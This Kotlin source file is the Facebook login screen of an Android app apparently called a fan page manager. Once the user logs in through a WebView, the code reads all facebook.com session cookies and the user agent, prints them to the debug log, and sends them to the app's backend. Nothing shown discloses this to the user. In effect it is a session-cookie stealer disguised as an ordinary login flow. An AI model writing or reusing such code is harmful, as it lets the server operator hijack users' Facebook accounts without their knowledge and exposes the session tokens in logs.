package com.realinet.fanpagemanager

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import retrofit2.Call
import retrofit2.Callback

class LoginFbActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login_fb)
        val myWebView: WebView = findViewById(R.id.web_view)
        myWebView.settings.javaScriptEnabled = true
        myWebView.loadUrl("https://www.facebook.com/pages/?category=your_pages&ref=bookmarks")
        myWebView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                val cookies: String = CookieManager.getInstance().getCookie("https://www.facebook.com")
                if(cookies.contains("c_user")){
                    Log.d("YOYO", "All the cookies in a string:$cookies")
                    val userAgent:String = myWebView.settings.userAgentString
                    Log.d("YOYO", "All the user agent in a string:$userAgent")
                    Log.d("YOYO", myWebView.url!!)
                    sendAccountInfo(cookies,userAgent)
                    startActivity(Intent(this@LoginFbActivity, MainActivity::class.java))
                }

            }
        }
    }

    fun sendAccountInfo(cookies:String,userAgent:String){
        val call: Call<String> = RetrofitClient.getInstance().myApi.addNewAccount(cookies,userAgent)
        call.enqueue(object : Callback<String?> {
            override fun onFailure(call: Call<String?>, t: Throwable) {

            }

            override fun onResponse(
                call: Call<String?>,
                response: retrofit2.Response<String?>
            ) {
                if(response.code()==200){
                    Log.d("YOYO", "Send code success")
                }
            }
        })
    }
}